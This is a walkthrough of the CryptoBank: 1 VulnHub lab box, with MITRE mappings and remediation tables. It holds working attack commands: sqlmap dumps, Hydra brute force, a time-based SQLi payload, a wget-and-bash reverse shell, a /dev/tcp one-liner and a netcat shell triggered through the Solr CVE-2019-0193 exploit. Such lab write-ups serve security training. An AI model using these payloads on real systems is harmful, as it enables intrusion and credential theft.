# CryptoBank: 1 — Writeup

> "Your vault is only as strong as your weakest query." ( ͡° ͜ʖ ͡°)
>
> A banking-themed Linux box that chains time-based SQL injection, an exposed git repo, command injection, and an internal Apache Solr RCE to reach root. Every service reused the same password — one leak to rule them all. ¯\_(ツ)_/¯

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | CryptoBank: 1 (Linux) |
| **Attacker VM** | Kali Linux 2023+ |
| **VulnHub URL** | https://www.vulnhub.com/entry/cryptobank-1 |
| **Techniques** | Virtual host enum, time-based blind SQLi, git repo dump, command injection, SSH port forwarding, Apache Solr RCE, sudo escalation |
| **CVEs** | CVE-2019-0193 (Apache Solr 8.1.1 RCE via DataImportHandler) |
| **APT Groups** | FIN7 (SQLi-driven financial intrusion chain), Lazarus Group (banking sector targeting), APT41 (combined web exploitation + internal pivot) |

---

## Attack Summary

```
[nmap] ports 22, 80
    |
    v
[Virtual host] cryptobank.local
    |
    v
[CORE TEAM page] employee names -> users.txt
    |
    v
[SQLMap time-based blind] cryptobank DB -> accounts table -> creds
    |
    v
[Hydra] /development HTTP Basic Auth -> julius.b:wJWm4CgV26
    |
    v
[GitHack] exposed .git -> PHP source -> same password
    |
    v
[Command Injection] CommandExecution.php -> reverse shell (www-data)
    |
    v
[Meterpreter] netstat reveals 172.17.0.1:8983 (Solr inside Docker)
    |
    v
[Port Forward] attacker port 8983 -> target Docker bridge
    |
    v
[CVE-2019-0193] Solr 8.1.1 RCE -> shell as solr user
    |
    v
[sudo su] password: "solr" -> uid=0(root) -> /root/flag.txt
```

---

## Methodology

1. Host discovery and port scan (netdiscover + nmap)
2. Virtual hostname identification and web enumeration
3. Username harvesting from CORE TEAM page
4. Time-based blind SQL injection via SQLMap (Burp request file)
5. Directory brute-force + HTTP Basic Auth credential attack with Hydra
6. Git repository extraction via GitHack for source code and credential review
7. Command injection to land initial shell, then Meterpreter upgrade
8. Internal service discovery via netstat, port forwarding, and Solr RCE (CVE-2019-0193)
9. Privilege escalation with default Solr sudo password

---

## Step 1: Reconnaissance

First things first: discover the target on the network and map what is listening.

```bash
netdiscover -r 192.168.1.0/24
```

Note the target IP from the ARP table. Then run a service scan:

```bash
export TARGET=192.168.1.105
nmap -sV $TARGET
```

Expected output (trimmed):

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd
```

Open ports: **22** (SSH) and **80** (HTTP). Only two doors. We will try both.

> **MITRE TTP:** T1595.002 — Active Scanning: Vulnerability Scanning

> **Real-world note:** Financial services companies are routinely scanned by FIN7 and Lazarus operators within hours of going live. A two-port footprint does NOT mean a small attack surface if the web application is complex.

> **Alternative:** `rustscan -a $TARGET --ulimit 5000 -- -sV` for much faster port discovery on lab networks.

---

## Step 2: Virtual Hostname Discovery

The main page (`http://$TARGET`) has a "Secure Login" button that links to `http://cryptobank.local/trade`. This means Apache is configured with a virtual host. Without the right `Host:` header, we see the default page; with it, we see the real app.

Add the virtual hostname to `/etc/hosts`:

```bash
echo "$TARGET cryptobank.local" | sudo tee -a /etc/hosts
```

Now browse to `http://cryptobank.local/` to confirm the full site loads. You should see the CORE TEAM section with employee profile links.

> **MITRE TTP:** T1590 — Gather Victim Network Information

---

## Step 3: Username Harvesting

Navigate to the CORE TEAM section. Each employee card has an email icon. Hover over it or view the page source: the `href` values contain patterns like `mailto:julius.b@cryptobank.local`. Collect every unique username-style prefix into a wordlist:

```bash
cat > users.txt << 'EOF'
julius.b
[add every name you find on the page]
EOF
```

This wordlist will feed Hydra later. ( •_•)

> **MITRE TTP:** T1589.003 — Gather Victim Identity Information: Employee Names

---

## Step 4: SQL Injection — Credential Extraction

Navigate to `http://cryptobank.local/trade` (the Secure Login form). Capture a POST request with Burp Suite and save it to `req.txt`.

First, enumerate available databases:

```bash
sqlmap -r req.txt --dbs --batch
```

The injection is time-based blind, so extraction is slow. Expect several minutes per query. When the database list appears, target `cryptobank`:

```bash
sqlmap -r req.txt -D cryptobank --tables --batch
```

Then dump the `accounts` table:

```bash
sqlmap -r req.txt -D cryptobank -T accounts --dump --batch
```

You will get 12+ entries including usernames and passwords in plaintext or easily crackable form. Build a `pass.txt` from the extracted passwords.

> **MITRE TTP:** T1190 — Exploit Public-Facing Application; T1078.001 — Valid Accounts: Default Accounts

> **Real-world note:** Time-based blind SQLi is used by APT41 and FIN7 precisely because WAFs frequently miss it. The technique sends payloads that cause the database to sleep for N seconds on a TRUE condition, inferring data bit by bit.

> **Alternative:** Manual extraction with `curl` and `sleep`-based payloads (`' OR IF(SUBSTRING(password,1,1)='a',SLEEP(2),0)-- -`) if you want to understand the mechanic without SQLMap.

---

## Step 5: Directory Brute-force and Development Login

Run dirb against the virtual host to find hidden directories:

```bash
dirb http://cryptobank.local/
```

A `/development` directory shows up with HTTP Basic Auth. Use Hydra with the harvested usernames and passwords:

```bash
hydra -L users.txt -P pass.txt cryptobank.local -f http-get /development
```

Valid pair found: `julius.b` / `wJWm4CgV26`. ( ˘ ³˘)♥

Now brute-force inside the authenticated directory:

```bash
dirb http://cryptobank.local/development/ -u julius.b:wJWm4CgV26
```

Directories found: `/development/tools/` and `/development/backups/`. Go deeper:

```bash
dirb http://cryptobank.local/development/backups/home/
```

A `.git` directory is exposed. This is where things get interesting. ( ͡° ͜ʖ ͡°)

> **MITRE TTP:** T1083 — File and Directory Discovery; T1212 — Exploitation for Credential Access

---

## Step 6: Git Repository Extraction

An exposed `.git` directory lets you reconstruct the full source tree. Clone GitHack and extract:

```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python GitHack.py http://cryptobank.local/development/backups/home/.git/
```

This rebuilds the repository under `cryptobank.local/`. Navigate to `tools/CommandExecution/` and inspect the PHP source. You will find the password for the command execution endpoint: `wJWm4CgV26` (same as the development auth — password reuse confirmed ¯\_(ツ)_/¯).

> **MITRE TTP:** T1213 — Data from Information Repositories; T1552.001 — Credentials in Files

> **Real-world note:** Over 400,000 real web servers have been found with exposed `.git` directories according to academic studies. This is not a lab-only problem. Breaches of this type have been exploited by Lazarus and other groups to exfiltrate source code from banking applications.

> **Alternative:** `git-dumper` (`pip install git-dumper`) is the modern replacement for GitHack: `git-dumper http://cryptobank.local/development/backups/home/.git/ output/`

---

## Step 7: Command Injection — Reverse Shell

Browse to the CommandExecution tool in the browser at `http://cryptobank.local/development/tools/CommandExecution/`. Authenticate with `julius.b:wJWm4CgV26`.

Verify execution first (always confirm before dropping a shell):

- Username field: `id`
- Password field: `wJWm4CgV26`

The `id` output should appear in the response. We have command execution as the web server user. Now craft a payload:

```bash
export LHOST=192.168.1.107
export LPORT=4444
msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw > revshell.sh
```

Host it:

```bash
python3 -m http.server 8000
```

Start the Metasploit listener:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload cmd/unix/reverse_bash; set LHOST $LHOST; set LPORT $LPORT; exploit"
```

Use the command injection to download and execute the payload (enter in the "username" field):

```
wget http://192.168.1.107:8000/revshell.sh -O /tmp/rs.sh && bash /tmp/rs.sh
```

A shell arrives as `www-data`.

> **MITRE TTP:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1105 — Ingress Tool Transfer

> **Alternative:** A pure bash one-liner in the injection field also works without hosting a file: `bash -i >& /dev/tcp/$LHOST/4444 0>&1`

---

## Step 8: Meterpreter Upgrade and Internal Discovery

From the Metasploit console, upgrade the bash shell to a Meterpreter session:

```bash
sessions -u 1
sessions 2
```

Now check internal network connections:

```bash
netstat -antp
```

Port **8983** is listening on `172.17.0.1`, which is a Docker network bridge interface. Apache Solr is running inside a Docker container, bound to the host-only Docker bridge. It is not reachable from the attacker directly.

> **MITRE TTP:** T1049 — System Network Connections Discovery; T1016 — System Network Configuration Discovery

---

## Step 9: Port Forwarding to Solr

Forward port 8983 through the Meterpreter session to make it accessible on the attacker machine:

```bash
portfwd add -l 8983 -p 8983 -r 172.17.0.1
```

Browse to `http://127.0.0.1:8983/` on the attacker machine. Apache Solr **8.1.1** is confirmed. ( ͡° ͜ʖ ͡°)

> **MITRE TTP:** T1572 — Protocol Tunneling; T1090 — Proxy

---

## Step 10: Apache Solr RCE (CVE-2019-0193)

Solr 8.1.1 is vulnerable to remote code execution via the DataImportHandler feature (CVE-2019-0193). Search for the exploit:

```bash
searchsploit solr
searchsploit -m 47572
```

Upload the exploit to the target's `/tmp` directory via Meterpreter:

```bash
upload /root/47572.py /tmp/47572.py
```

Upgrade the Meterpreter shell to a TTY:

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

Start a netcat listener:

```bash
nc -lvp 7654
```

Execute the exploit:

```bash
cd /tmp
python3 47572.py 172.17.0.1 8983 "nc -e /bin/bash 192.168.1.107 7654"
```

A shell arrives on port 7654. Bingo!! (☞ﾟヮﾟ)☞

> **MITRE TTP:** T1210 — Exploitation of Remote Services; T1068 — Exploitation for Privilege Escalation

> **Real-world note:** CVE-2019-0193 was actively exploited by cryptomining groups and APT41 shortly after public disclosure. Solr instances accessible from an internal network after a DMZ compromise are a classic lateral movement pivot.

---

## Step 11: Privilege Escalation

In the Solr shell, upgrade to TTY and check sudo permissions:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
sudo -l
```

Full sudo access is configured. The default Solr service password is `solr`:

```bash
sudo su
# Password: solr
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root! ᕕ( ᐛ )ᕗ

```bash
cd /root
cat flag.txt
```

> **MITRE TTP:** T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching

---

## Captured Flags / Hashes / Creds

| Item | Value |
|------|-------|
| Development HTTP Basic Auth | `julius.b` / `wJWm4CgV26` |
| CommandExecution password | `wJWm4CgV26` |
| Solr sudo password | `solr` |
| SQL dump accounts | 12 entries (see `loot/sqlmap-dump.txt`) |
| Root flag | `/root/flag.txt` |

---

## Lessons Learned

1. **Exposed `.git` directories** on production web servers allow full source code and credential recovery. Any attacker with HTTP access can reconstruct your entire commit history.

2. **Time-based blind SQLi** works even when the application returns no visible error output. Defense requires parameterized queries, not just hiding error messages.

3. **Password reuse across all services** (SQL dump, HTTP Basic Auth, command execution, Solr) meant a single credential leak gave access to the entire chain. One key opened every door.

4. **Running Solr inside Docker does not isolate it** once the host is compromised and port forwarding is available. Network segmentation must be enforced at the host-firewall level, not just with container networking.

5. **Default service passwords** (`solr` for Solr) in sudo rules are a critical misconfiguration. Any service with a known default password must have that password changed before deployment.

**Real-World Relevance:** This attack chain (SQLi to credential dump, pivot to internal service, RCE) mirrors documented FIN7 intrusions against banking sector targets. The combination of exposed source code, password reuse, and an unpatched internal service is disturbingly common.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Tool |
|--------|-----------|-----|------|
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 | nmap |
| Reconnaissance | Gather Victim Network Information | T1590 | manual |
| Reconnaissance | Gather Victim Identity Information: Employee Names | T1589.003 | browser |
| Initial Access | Exploit Public-Facing Application | T1190 | SQLMap |
| Credential Access | Data from Information Repositories | T1213 | GitHack |
| Credential Access | Credentials in Files | T1552.001 | git diff |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | PHP injection |
| Execution | Exploitation of Remote Services | T1210 | CVE-2019-0193 |
| Lateral Movement | Protocol Tunneling | T1572 | Meterpreter portfwd |
| Discovery | System Network Connections Discovery | T1049 | netstat |
| Discovery | File and Directory Discovery | T1083 | dirb |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 | sudo su |
| Command and Control | Ingress Tool Transfer | T1105 | python3 http.server |

---

## Remediation

### NIST CSF 2.0

| Function | Control | Action |
|----------|---------|--------|
| Identify (ID.AM) | Asset inventory | Catalog all internal services including those inside Docker |
| Protect (PR.AC) | Access control | Remove NOPASSWD sudo from service accounts |
| Protect (PR.DS) | Data security | Block `.git` access at the web server config level |
| Detect (DE.CM) | Continuous monitoring | Alert on time-delayed SQL query patterns (WAF + SIEM) |
| Respond (RS.MI) | Incident mitigation | Isolate Solr to a dedicated VLAN with no egress to web tier |

### NIST SP 800-53 Rev. 5

| Control | Description |
|---------|-------------|
| SI-2 | Flaw Remediation: patch Solr to latest stable; upgrade regularly |
| AC-6 | Least Privilege: remove full sudo from `solr` service account |
| IA-5 | Authenticator Management: enforce unique passwords per service |
| SC-7 | Boundary Protection: firewall Docker bridge interfaces from web tier |
| SA-15 | Development Process: block deployment of repositories with secrets in git history |

### CISA KEV

CVE-2019-0193 (Apache Solr DataImportHandler RCE) has been listed in CISA's Known Exploited Vulnerabilities catalog. Organizations should apply patches immediately or disable the DataImportHandler feature if not in use.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Gap |
|--------|----------|-----|
| Asset, Change, and Configuration Management (ASSET) | MIL-1 | Internal services (Solr) not tracked in asset inventory |
| Identity and Access Management (IAM) | MIL-2 | Service account passwords not rotated; sudo not scoped |
| Threat and Vulnerability Management (THREAT) | MIL-1 | No patch process for internal middleware; `.git` misconfiguration undetected |

### MITRE D3FEND

| D3FEND Technique | ID | Addresses |
|------------------|----|-----------|
| Web Application Firewall | D3-WAF | SQLi detection and blocking |
| Application Configuration Hardening | D3-ACH | Block `.git` HTTP access; disable Solr DataImportHandler |
| Network Traffic Filtering | D3-NTF | Block internal Docker bridge from web tier |
| Credential Transmission Scoping | D3-CTS | Enforce unique credentials per service |
| Software Update | D3-SU | Patch Solr to version without CVE-2019-0193 |

---

## Final Thoughts

CryptoBank: 1 is a masterclass in what credential reuse looks like when it goes all the way down the stack. The intended difficulty is "intermediate," but the techniques here — time-based SQLi, git dump, port forwarding to an internal RCE — are exactly what red teams use against real financial targets. If you solved this one, you understand why FIN7 has been so effective for a decade.

Special thanks to the author for building a box that layers every step logically. Every piece of the puzzle earned its place in the chain. ಠᴗಠ

Thanks guys!! (❍ᴥ❍ʋ)
